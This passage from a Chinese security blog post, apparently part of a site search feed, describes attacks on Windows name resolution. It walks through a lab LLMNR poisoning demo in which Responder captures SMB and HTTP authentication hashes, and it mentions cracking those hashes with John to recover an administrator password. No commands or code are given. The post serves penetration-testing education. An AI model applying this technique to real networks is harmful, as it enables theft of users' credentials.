条，这四种解析行为会尝试发起网络请求，容易受到攻击。</p><h2 id="0x03-利用-Windows-名称解析机制的缺陷进行内网攻击"><a href="#0x03-利用-Windows-名称解析机制的缺陷进行内网攻击" class="headerlink" title="0x03 利用 Windows 名称解析机制的缺陷进行内网攻击"></a>0x03 利用 Windows 名称解析机制的缺陷进行内网攻击</h2><p>常见的利用 Windows 名称解析机制的缺陷进行攻击的技术有 DNS Spoof、NBNS Poison、LLMNR Poison 和 ICMP Redirection。</p><blockquote><p>可以使用 SpiderLabs 的 Responder，或者 ZARP 工具包进行上述攻击。</p></blockquote><p>LLMNR Poison 攻击环境如下：</p><ul><li>攻击者主机（Linux）IP：192.168.253.131</li><li>受害者主机（Windows 8.1） IP：192.168.253.130</li><li>两台主机处于同一个局域网中</li></ul><p>攻击者在启动 Responder 后，当受害者去访问一个在当前局域网中不存在的主机时就会触发 LLMNR Poison 攻击，如下图所示：</p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_094148.png" alt="受害者使用 net 指令访问一台局域网中并不存在的主机"></p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_094127.png" alt="Responder 会响应 LLMNR 的广播包并进行了 Poison 攻击"></p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_094158.png" alt="在受害者主机的 NetBIOS 缓存中已经加入了被 Poison 攻击的主机 IP 记录"></p><p>上述攻击演示中，已经证实了 LLMNR Poison 攻击的效果，可以利用让受害者访问不存在的主机的共享，进行 LLMNR Poison 攻击。这样可以获得受害者主机的 HASH ，拿到 HASH 就可以进行暴力破解了，如果是弱口令的话，就可以爆破出密码。同样也可以利用让受害者访问不存在的 HTTP 服务器进行 401 认证拿到客户端的 HASH，如下图所示：</p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_100249.png" alt="受害者访问一个不存在的主机的共享"></p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_100350.png" alt="LLMNR Poison 攻击同样拿到了 SMB 验证过程中的 HASH"></p><p>获取 HASH 后，可以使用 John 对 HASH 进行暴力破解，获取用户的管理员口令。</p><p><strong>参考文章：</strong><a href="https://xz.aliyun.com/t/1740/">https://xz.aliyun.com/t/1740/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>名称解析</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
